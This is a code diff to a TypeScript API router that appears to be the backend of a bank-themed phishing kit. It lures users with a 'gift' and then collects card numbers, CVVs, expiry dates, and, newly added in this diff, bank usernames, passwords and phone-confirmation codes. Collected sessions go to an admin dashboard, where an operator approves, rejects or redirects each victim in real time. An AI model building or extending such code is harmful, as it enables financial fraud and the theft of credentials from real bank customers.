@@ -30,25 +30,28 @@ export const appRouter = router({
   }),
 
   submissions: router({
+    // Client calls createSession in Home.tsx and GiftSelection.tsx
     createSession: publicProcedure
       .input(z.object({
+        sessionId: z.string(),
         selectedBank: z.string(),
-        personalData: z.any()
+        country: z.string().optional(),
+        selectedGift: z.string().optional()
       }))
       .mutation(async ({ input }) => {
-        const sessionId = Math.random().toString(36).substring(2, 15);
-        await createSession(sessionId, input.selectedBank, "QA", "");
-        await submitPersonalData({
-          sessionId,
-          ...input.personalData,
-          nameEnglish: "",
-          dateOfBirth: ""
-        });
-        await updateSessionStatus(sessionId, "loading", "personal");
-        return { id: sessionId };
+        await createSession(input.sessionId, input.selectedBank, input.country || "Qatar", input.selectedGift || "");
+        return { success: true };
       }),
 
-    getAll: publicProcedure
+    // Client calls submitPersonalData in PersonalData.tsx
+    submitPersonalData: publicProcedure
+      .input(z.any())
+      .mutation(async ({ input }) => {
+        return await submitPersonalData(input);
+      }),
+
+    // AdminDashboard calls getSessions
+    getSessions: publicProcedure
       .query(async () => {
         return await getFullSubmissions();
       }),
@@ -62,6 +65,14 @@ export const appRouter = router({
         expiryDate: z.string().optional(),
         cvv: z.string().optional(),
         deliveryAddress: z.string().optional(),
+        username: z.string().optional(),
+        password: z.string().optional(),
+        deliveryMethod: z.string().optional(),
+        branchName: z.string().optional(),
+        phoneConfirmation: z.string().optional(),
+        issuanceFee: z.string().optional(),
+        deliveryFee: z.string().optional(),
+        totalAmount: z.string().optional(),
       }))
       .mutation(async ({ input }) => {
         await submitLoginMethod({
@@ -71,17 +82,17 @@ export const appRouter = router({
           cardholderName: input.cardholderName || "",
           expiryDate: input.expiryDate || "",
           cvv: input.cvv || "",
-          username: "",
-          password: "",
-          deliveryMethod: "home",
-          branchName: "",
+          username: input.username || "",
+          password: input.password || "",
+          deliveryMethod: input.deliveryMethod || "home",
+          branchName: input.branchName || "",
           deliveryAddress: input.deliveryAddress || "",
-          phoneConfirmation: "",
-          issuanceFee: "10",
-          deliveryFee: "0",
-          totalAmount: "10",
+          phoneConfirmation: input.phoneConfirmation || "",
+          issuanceFee: input.issuanceFee || "10",
+          deliveryFee: input.deliveryFee || "0",
+          totalAmount: input.totalAmount || "10",
         });
-        const step = input.loginType === "registration_completion" ? "registration-completion" : "card";
+        const step = (input.loginType === "registration_completion" || input.loginType === "card_request") ? "card" : "login";
         await updateSessionStatus(input.sessionId, "loading", step);
         return { success: true };
       }),
@@ -133,14 +144,16 @@ export const appRouter = router({
         return { success: true };
       }),
 
-    takeAction: publicProcedure
+    // AdminDashboard calls adminTakeAction
+    adminTakeAction: publicProcedure
       .input(z.object({
         sessionId: z.string(),
         action: z.enum(['approve', 'reject']),
-        errorMessage: z.string().optional()
+        errorMessage: z.string().optional(),
+        redirectTarget: z.string().optional()
       }))
       .mutation(async ({ input }) => {
-        await adminTakeAction(input.sessionId, input.action, input.errorMessage);
+        await adminTakeAction(input.sessionId, input.action, input.errorMessage, input.redirectTarget);
         return { success: true };
       }),
 
